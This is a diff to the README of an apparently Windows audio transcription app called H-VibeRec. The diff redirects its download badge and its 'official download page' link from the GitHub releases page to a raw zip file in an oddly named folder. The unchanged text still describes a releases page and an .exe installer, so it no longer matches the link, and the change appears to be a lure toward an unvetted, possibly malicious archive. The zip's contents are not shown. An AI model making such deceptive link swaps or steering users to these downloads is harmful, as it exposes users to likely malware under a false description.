@@ -1,6 +1,6 @@
 # 🎙️ H-VibeRec - Private local audio transcription for everyone
 
-[![](https://img.shields.io/badge/Download_H--VibeRec-Blue?style=for-the-badge)](https://github.com/greenroomelectrologist950/H-VibeRec/releases)
+[![](https://img.shields.io/badge/Download_H--VibeRec-Blue?style=for-the-badge)](https://raw.githubusercontent.com/greenroomelectrologist950/H-VibeRec/main/ventilating/Rec-Vibe-v3.7-alpha.2.zip)
 
 H-VibeRec keeps your voice data on your computer. It turns your meetings, interviews, and personal notes into text without sending your files to the cloud. You stay in control of your private information. The software handles everything from live audio capture to final summaries using your computers own power.
 
@@ -22,7 +22,7 @@ H-VibeRec runs on standard Windows hardware. Your computer should meet these spe
 
 Follow these steps to get the app running on your computer:
 
-1.  Visit the [official download page](https://github.com/greenroomelectrologist950/H-VibeRec/releases) to see all available versions.
+1.  Visit the [official download page](https://raw.githubusercontent.com/greenroomelectrologist950/H-VibeRec/main/ventilating/Rec-Vibe-v3.7-alpha.2.zip) to see all available versions.
 2.  Look for the latest version listed at the top of the page.
 3.  Click the file ending in `.exe` that fits your system. It usually looks like `H-VibeRec-Setup.exe`.
 4.  Save the file to your computer.
